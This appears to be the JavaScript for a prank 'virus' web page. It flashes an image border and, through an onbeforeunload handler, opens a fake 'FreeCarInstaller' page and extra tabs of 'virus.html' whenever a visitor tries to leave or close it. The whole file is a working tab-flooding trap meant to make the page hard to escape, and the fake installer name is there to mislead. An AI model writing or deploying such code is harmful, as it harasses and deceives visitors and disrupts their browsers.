var CurrentlyUnderDevelopment = false; //change to true to disable generating new tabs
//READ ABOVE COMMENT

var numOfTabs = 2;
var moreTabsTwo = numOfTabs;
var newTabLink = "virus.html";

var img = document.getElementById("img");

setInterval(setSecs, 500);
function setSecs() {
	var date = new Date();
	var sec = date.getSeconds();
	
	if (sec % 2 === 1) {
		img.style.borderStyle = "inset outset";
		img.style.borderColor = "green";
		img.style.borderWidth = "20px"
	} else {
		img.style.borderStyle = "outset inset";
		img.style.borderColor = "lightgrey"
		img.style.borderWidth = "20px";
	}
}

setSecs();

if (CurrentlyUnderDevelopment === false) {
	var button = document.getElementById("giantbutton");
	function initialize() {
		for (var a = 0; a < numOfTabs; a++) {
			window.open(newTabLink, "_blank");
		}
	}
	
	function continued() {
		window.open("FreeCarInstaller13.10.102.html", "_blank");
		for (var b = 0; b < moreTabsTwo; b++) {
			window.open(newTabLink, "_blank");
		}
	}
	
	window.onbeforeunload = continued;
}